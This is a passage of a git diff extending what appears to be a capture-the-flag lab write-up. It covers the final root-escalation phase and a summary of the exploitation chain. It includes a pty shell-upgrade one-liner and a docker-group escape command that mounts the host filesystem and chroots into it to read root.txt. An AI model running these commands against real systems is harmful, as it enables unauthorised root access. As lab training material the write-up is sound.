@@ -169,3 +169,61 @@ Finding: feedback.sh executable as user jerry
 <img width="734" height="557" alt="image" src="https://github.com/user-attachments/assets/558b9056-0f58-42e4-960d-5e7419dc0682" />
 
  Flag 2 captured
+
+
+ # Phase 7: Root Access via Docker
+
+ ## Interactive Shell Upgrade
+
+     python -c 'import pty; pty.spawn("/bin/bash")'
+
+ ## Verify Privileges
+
+     id
+
+ ### Finding: User jerry belongs to docker group
+
+ <img width="544" height="101" alt="image" src="https://github.com/user-attachments/assets/ee0728c0-69c7-4794-ac63-c42aecdab4f6" />
+
+ ## List Docker Images
+
+     docker image ls
+
+ <img width="748" height="51" alt="image" src="https://github.com/user-attachments/assets/45b1d12a-c616-4cf1-b563-b1da319856ed" />
+
+## Exploit Docker Alpine
+
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+## Root Confirmation
+
+    id
+    cd /root
+    ls -al
+    cat root.txt
+
+<img width="956" height="647" alt="image" src="https://github.com/user-attachments/assets/bd7217f5-b130-425f-88c2-f41cb0bf7a56" />
+
+ Root flag obtained! Machine fully compromised!
+
+
+ # Summary
+
+ ## Exploitation Chain:
+
+- ✅ Discovered hidden directory via directory enumeration
+- ✅ Extracted FTP credentials from QR code
+- ✅ Retrieved password list and username from FTP
+- ✅ Brute-forced SSH credentials
+- ✅ Exploited bash injection in feedback script
+- ✅ Leveraged docker group membership for root
+- ✅ Obtained all flags and root shell
+
+## Key Vulnerabilities:
+
+- Weak credential storage (QR code on web)
+- Insufficient input validation (script injection)
+- Excessive docker group permissions
+- Unprotected sensitive files via FTP
+
+
